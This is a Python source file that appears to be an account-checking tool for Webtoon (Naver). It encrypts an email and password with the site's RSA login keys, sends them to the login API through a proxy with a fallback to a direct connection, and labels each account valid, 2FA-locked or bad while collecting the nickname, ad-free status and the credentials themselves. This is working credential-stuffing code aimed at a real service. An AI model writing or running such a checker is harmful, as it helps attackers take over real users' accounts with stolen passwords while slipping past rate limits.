from rsa import PublicKey, encrypt as rsae
from binascii import hexlify
import requests
import time

def chrlen(n: str) -> str:
    return chr(len(n))

def encrypt(json_data, mail, pw):
    """Fixed RSA encryption - correct PublicKey order"""
    try:
        session_key = json_data['sessionKey']
        string = f"{chrlen(session_key)}{session_key}{chrlen(mail)}{mail}{chrlen(pw)}{pw}".encode('utf-8')

        mod = int(json_data['nvalue'], 16)
        evl = int(json_data['evalue'], 16)
        
        # ✅ Correct order (matches your original working CLI)
        pbk = PublicKey(evl, mod)

        out = rsae(string, pbk)
        return hexlify(out).decode('utf-8')

    except Exception as e:
        error_str = str(e).lower()
        if "bytes needed for message" in error_str or "space for" in error_str:
            raise ValueError("RSA_KEY_TOO_SMALL") from e
        raise


def get_rsa_keys(proxy_url=None):
    """Get RSA keys with retry"""
    for attempt in range(3):
        try:
            proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
            resp = requests.get(
                "https://www.webtoons.com/member/login/rsa/getKeys",
                timeout=12,
                proxies=proxies
            )
            resp.raise_for_status()
            return resp.json()
        except Exception:
            if attempt < 2:
                time.sleep(0.7)
                continue
    return None


def check_webtoon(email: str, password: str, proxy_url=None) -> dict:
    """
    Webtoon Checker - Rich Data + Automatic Proxy Fallback
    Returns: nickname, loginId, loginType, adFree, etc.
    """
    # Order of attempts: proxy first → direct fallback
    attempt_list = [proxy_url] if proxy_url else [None]
    if proxy_url:
        attempt_list.append(None)

    last_error = "Unknown error"

    for current_proxy in attempt_list:
        try:
            keys = get_rsa_keys(proxy_url=current_proxy)
            if not keys:
                last_error = 'Failed to get RSA keys'
                if current_proxy is not None:
                    continue
                else:
                    break

            # Try encryption
            try:
                encpw = encrypt(keys, email, password)
            except ValueError as ve:
                if "RSA_KEY_TOO_SMALL" in str(ve):
                    last_error = 'RSA encryption failed (weak key)'
                    if current_proxy is not None:
                        continue
                    else:
                        break
                raise

            proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None

            url = "https://global.apis.naver.com/lineWebtoon/webtoon/loginById.json"
            payload = {
                "serviceZone": "GLOBAL",
                "encpw": encpw,
                "loginType": "EMAIL",
                "v": "3",
                "language": "en",
                "encnm": keys["keyName"]
            }

            resp = requests.post(url, data=payload, timeout=15, proxies=proxies)
            data = resp.json()

            result_data = data.get('message', {}).get('result', {})
            login_status = result_data.get('login_status')

            if login_status == 0:
                # === RICH DATA ===
                return {
                    'email': email,
                    'password': password,
                    'success': True,
                    'status': 'Active',
                    'message': 'Valid Account',
                    'nickname': result_data.get('nickname') or result_data.get('nickName'),
                    'loginId': result_data.get('loginId'),
                    'profileUrl': result_data.get('profileUrl'),
                    'loginType': result_data.get('loginType', 'N/A'),
                    'loginType': result_data.get('loginType') or 'Email',
                    'adFree': result_data.get('adFree', False),
                    'snsShowName': result_data.get('snsShowName')
                }

            elif login_status == 90000:
                return {'email': email, 'password': password, 'success': False, 'status': '2FA', 'message': 'Email Verification Required'}
            elif login_status == 210:
                return {'email': email, 'password': password, 'success': False, 'status': 'BAD', 'message': 'Invalid Password'}
            else:
                return {'email': email, 'password': password, 'success': False, 'status': 'BAD', 'message': f'Invalid Account ({login_status})'}

        except Exception as e:
            last_error = str(e)[:100]
            if current_proxy is not None:
                continue
            else:
                break

    # All attempts failed
    return {
        'email': email,
        'password': password,
        'success': False,
        'message': last_error
    }
